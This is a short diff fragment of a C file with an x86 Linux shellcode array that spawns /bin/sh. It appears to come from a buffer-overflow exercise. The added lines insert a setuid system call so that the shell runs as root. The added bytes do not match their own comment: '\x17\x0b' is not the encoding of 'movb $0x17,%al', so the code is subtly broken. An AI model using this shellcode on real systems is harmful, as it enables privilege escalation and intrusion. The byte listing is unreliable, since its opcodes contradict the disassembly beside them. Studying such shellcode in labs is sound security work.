@@ -7,6 +7,10 @@
 const char code[] =
   "\x31\xc0"             /* xorl    %eax,%eax              */
   "\x50"                 /* pushl   %eax                   */
+  "\x17\x0b"             /* movb    $0x17,%al              */
+  "\xcd\x80"             /* int     $0x80                  */
+  "\x31\xc0"             /* xorl    %eax,%eax              */
+  "\x50"                 /* pushl   %eax                   */
   "\x68""//sh"           /* pushl   $0x68732f2f            */
   "\x68""/bin"           /* pushl   $0x6e69622f            */
   "\x89\xe3"             /* movl    %esp,%ebx              */
